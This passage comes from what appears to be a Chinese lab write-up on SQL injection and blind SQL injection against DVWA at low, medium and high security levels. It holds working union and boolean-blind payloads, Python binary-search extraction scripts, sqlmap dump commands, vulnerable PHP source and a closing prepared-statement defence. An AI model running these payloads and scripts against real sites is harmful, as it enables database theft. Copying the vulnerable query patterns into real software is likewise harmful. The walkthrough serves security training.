<pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=database()<span class="hljs-meta">#</span>
<span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-meta">#</span>
<span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-meta">#</span></code></pre>



<p><img src="https://i.loli.net/2020/11/06/4sjoOwYKa3lW6S1.png" alt="sqlh-2.png"></p>
<p><img src="https://i.loli.net/2020/11/06/vXlbSQk1cn2JTAB.png" alt="sqlh-3.png"></p>
<p><img src="https://i.loli.net/2020/11/06/IohbvktCq2NpyDa.png" alt="sqlh-4.png"></p>
<p>源码分析</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span> [ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];

    <span class="hljs-comment">// Check database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;
    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">// Get results</span>
    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;
        <span class="hljs-comment">// Get values</span>
        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];
        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];

        <span class="hljs-comment">// Feedback for end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;
    &#125;

    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<pre><code class="hljs n1ql">$query  = &quot;<span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>;&quot;;</code></pre>

<p>存在注入的语句只是在low级别的基础上加上了<code>Limit</code>限制了回显的行数，但是使用low级别的注入语句时会直接把<code>Limit 1</code>注释掉，所以完全与low级别一样。</p>
<h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
<h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><h4 id="手工加脚本"><a href="#手工加脚本" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>查询成功返回的语句：User ID exists in the database.</p>
<p>查询失败返回的语句：User ID is MISSING from the database.</p>
<p>这样就可以利用提示信息确定，我们所查询的语句是否正确</p>
<p>首先确定盲注的语句</p>
<p>通过下面的测试，说明ascii函数是可以使用的，写注入的脚本，二分法更快点。</p>
<pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substring(database(),1,1))&gt;50 #</span>
<span class="hljs-string">提示 ：User ID exists in the database.</span>
<span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substring(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">50</span> #
提示： <span class="hljs-keyword">User</span> ID <span class="hljs-keyword">is</span> MISSING <span class="hljs-keyword">from</span> the <span class="hljs-keyword">database</span>.</code></pre>





<p><img src="https://i.loli.net/2020/12/08/nyQJR3ZHDYW87wt.png" alt="image-20201026201632666"></p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/10/26 17:29</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : dvwa.py</span>
<span class="hljs-comment"># 二分法盲注</span>
<span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=&quot;</span>

header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span>&#125;
flag = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment">#获取数据库名</span>
        <span class="hljs-comment">#payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#获取表名</span>
        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#获取列名</span>
        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#获取flag</span>
        payload = <span class="hljs-string">&quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        url1 =url+payload+<span class="hljs-string">&quot;&amp;Submit=Submit#&quot;</span>
        response = requests.post(url1,headers= header)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exists&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
print(flag)</code></pre>

<p>1.首先获取表名</p>
<p>使用payload:</p>
<pre><code class="hljs n1ql">payload = &quot;1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/YfAIjUFeiEodHML.png" alt="bsqll-1.png"></p>
<p>2.获取列名</p>
<p>使用payload</p>
<pre><code class="hljs n1ql">payload = &quot;1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/AoaD41sLJ5wmbeG.png" alt="bsqll-2.png"></p>
<p>3.获取flag</p>
<p>使用payload</p>
<pre><code class="hljs n1ql">payload = &quot;1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(fl4g),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/9taguv2jR6cU5VD.png" alt="bsqll-3.png"></p>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre>



<h3 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h3><h4 id="手工加脚本-1"><a href="#手工加脚本-1" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>与low级别不同，中级别提交数据是post类型，所以需要抓包后再提交。</p>
<pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">4</span> #&amp;Submit=Submit
提示<span class="hljs-keyword">User</span> ID <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> the <span class="hljs-keyword">database</span>.
id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> #&amp;Submit=Submit
<span class="hljs-keyword">User</span> ID <span class="hljs-keyword">is</span> MISSING <span class="hljs-keyword">from</span> the <span class="hljs-keyword">database</span></code></pre>

<p>所以思路还是与low级别一样，只不过脚本中提交数据的方式改为POST类型</p>
<p>直接上脚本</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span>

header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>&#125;
flag = <span class="hljs-string">&quot;&quot;</span>
t = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment">#payload = &quot;1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#payload = &quot;1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#payload = &quot;1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload, <span class="hljs-string">&#x27;Submit&#x27;</span>: <span class="hljs-string">&#x27;Submit&#x27;</span>&#125;

        response = requests.post(url,headers = header,data=data)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exists&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    print(mid)
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
print(flag)
</code></pre>

<h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre><code class="hljs dsconfig"><span class="hljs-string">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-built_in">--dbs</span>
<span class="hljs-built_in"></span>
<span class="hljs-built_in"></span>
<span class="hljs-built_in">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">dvwa</span> <span class="hljs-built_in">--tables</span>
<span class="hljs-built_in"></span>
<span class="hljs-built_in">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">dvwa</span> -<span class="hljs-string">T</span> <span class="hljs-string">flag</span> <span class="hljs-built_in">--columns</span>
<span class="hljs-built_in"></span>
<span class="hljs-built_in">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">dvwa</span> -<span class="hljs-string">T</span> <span class="hljs-string">flag</span> -<span class="hljs-string">C</span> <span class="hljs-string">fl4g</span> <span class="hljs-built_in">--dump</span>
<span class="hljs-built_in"></span></code></pre>



<p><img src="https://i.loli.net/2020/11/12/uI6w2bnCjsJfQHG.png" alt="bsqlh-1.png"></p>
<p>sqlmap中给了三种注入方式，并且给出了payload，可以基于给出的提示继续做下去</p>
<p>下面是sqlmap爆出的flag。</p>
<p><img src="https://i.loli.net/2020/11/12/ZdwnMI6vhbRCikc.png" alt="bsqlh-2.png"></p>
<p>源码分析</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123; 
    <span class="hljs-comment">// Get input </span>
    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ]; 
    <span class="hljs-variable">$id</span> = mysql_real_escape_string( <span class="hljs-variable">$id</span> ); 

    <span class="hljs-comment">// Check database </span>
    <span class="hljs-variable">$getid</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>; 
    <span class="hljs-variable">$result</span> = mysql_query( <span class="hljs-variable">$getid</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors </span>

    <span class="hljs-comment">// Get results </span>
    <span class="hljs-variable">$num</span> = @mysql_numrows( <span class="hljs-variable">$result</span> ); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors </span>
    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span> ) &#123; 
        <span class="hljs-comment">// Feedback for end user </span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>; 
    &#125; 
    <span class="hljs-keyword">else</span> &#123; 
        <span class="hljs-comment">// Feedback for end user </span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>; 
    &#125; 

    <span class="hljs-comment">//mysql_close(); </span>
&#125; 

<span class="hljs-meta">?&gt;</span></code></pre>

<p><strong>mysql_real_escape_string()</strong> 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: <code>\x00</code>, <code>\n</code>, <code>\r</code>, <code>\</code>, <code>&#39;</code>, <code>&quot;</code> 和 <code>\x1a</code>.</p>
<p>本质上跟low级别的没有太大的区别，只是将一些特殊字符转义，但是我们注入时没有用到这些字符，所以注入语句基本和low级别一样</p>
<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /dvwa/vulnerabilities/sqli_blind/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
<span class="hljs-attribute">Host</span>: <span class="hljs-number">10.5.8.66</span>
<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">82</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">82</span>.<span class="hljs-number">0</span>
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
<span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span>
<span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">10.5.8.66</span>/dvwa/vulnerabilities/sqli/
<span class="hljs-attribute">Connection</span>: close
<span class="hljs-attribute">Cookie</span>: id=<span class="hljs-number">1</span>; security=high; PHPSESSID=e<span class="hljs-number">31</span>dkassqtg<span class="hljs-number">9388</span>l<span class="hljs-number">159</span>fn<span class="hljs-number">72</span>ac<span class="hljs-number">1</span>
<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span>
<span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span></code></pre>

<p>抓包后可以发现提交的参数<code>id</code>在cookie中，所以与中级别的方法不一样了，但是还是可以使用sqlmap注入。</p>
<h4 id="手工加脚本-2"><a href="#手工加脚本-2" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>通过手工测试发现是字符型注入，与low级别的脚本大同小异，只是将注入的位置改到了cookie的位置</p>
<p><img src="https://i.loli.net/2020/11/12/I257FMGp9VNfiac.png" alt="bsqlh-3.png"></p>
<p><img src="https://i.loli.net/2020/11/12/TtyDpsOmZEfBbVe.png" alt="bsqlh-4.png"></p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span>
t=<span class="hljs-string">&quot;&quot;</span>
flag = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment">#payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-built_in">id</span> = payload
        header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;id=&quot;</span>+payload+<span class="hljs-string">&quot;;&quot;</span>+<span class="hljs-string">&quot;security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>&#125;
        <span class="hljs-comment">#print(header)</span>
        response = requests.post(url,headers = header)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exists&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    print(mid)
    <span class="hljs-comment">#print(t)</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
print(flag)</code></pre>



<h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre>

<p><img src="https://i.loli.net/2020/11/12/jLdrQDiI9XlAZcU.png" alt="bsqlh-5.png"></p>
<h3 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h3><p>通过查看impossible源码发现检测了id数据类型，使用了预编译绑定id变量，有效防止SQL注入，这些可以在以后编程中应用，以编写出更加安全的代码。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );

    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];

    <span class="hljs-comment">// Was a number entered?</span>
    <span class="hljs-keyword">if</span>(is_numeric( <span class="hljs-variable">$id</span> )) &#123;   <span class="hljs-comment">//检测提交的数据是否为数字类型</span>
        <span class="hljs-comment">// Check the database</span>
        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<span class="hljs-comment">//预编译绑定了id变量</span>
        <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::PARAM_INT );
        <span class="hljs-variable">$data</span>-&gt;execute();

        <span class="hljs-comment">// Get results</span>
        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) &#123;
            <span class="hljs-comment">// Feedback for end user</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;
        &#125;
        <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span>
